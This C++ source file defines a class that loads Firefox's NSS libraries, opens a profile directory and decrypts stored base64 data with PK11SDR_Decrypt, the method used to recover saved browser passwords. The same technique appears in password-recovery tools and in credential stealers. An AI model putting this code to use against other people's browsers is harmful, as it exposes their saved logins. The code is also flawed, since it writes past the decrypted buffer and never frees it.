#include "FirefoxDecryptor.h"

#include "Base64.h"

FirefoxDecryptor::~FirefoxDecryptor()
{
	if(m_NssShutdown)
		m_NssShutdown();
	FreeLibrary(m_hNss3);
	FreeLibrary(m_hMozGlue);
}

bool FirefoxDecryptor::init(const String& sPath)
{
	try
	{
		const auto mozglue_dll_path = sPath + "\\mozglue.dll";
		const auto nss_3_dll_path = sPath + "\\nss3.dll";
		m_hMozGlue = LoadLibrary(mozglue_dll_path.c_str());		
		m_hNss3 = LoadLibrary(nss_3_dll_path.c_str());

		if(!m_hMozGlue || !m_hNss3) return false;
		
		m_NssInit =  reinterpret_cast<NssInit*>(GetProcAddress(m_hNss3, "NSS_Init"));
		m_ipNssPk11SdrDecrypt = reinterpret_cast<Pk11SdrDecrypt*>(GetProcAddress(m_hNss3, "PK11SDR_Decrypt"));
		m_NssShutdown = reinterpret_cast<NssShutdown*>(GetProcAddress(m_hNss3, "NSS_Shutdown"));
		
		return true;
	}
	catch (...)
	{		
		return false;
	}
}

bool FirefoxDecryptor::set_profile_dir(const String& profile_dir)
{
	return (m_NssInit((char*)profile_dir.c_str()) == 0);
}

bool FirefoxDecryptor::decrypt_data(const String& encrypted_data, String& decrypted_data)
{
    try
    {
        auto base_decoded = base64_decryptor::base64_decode(encrypted_data);
		SECItem in, out;
    	
		in.type = SECItemType::siBuffer;
		in.data = (unsigned char*) base_decoded.c_str();
		in.len = base_decoded.length();

		if (m_ipNssPk11SdrDecrypt(&in, &out, NULL) != 0)
		{
			return false;
		}

		out.data[out.len] = '\0';
    	
		decrypted_data = reinterpret_cast<char*>(out.data);
    }
    catch (...)
    {       
        return false;
    }

	return true;
}
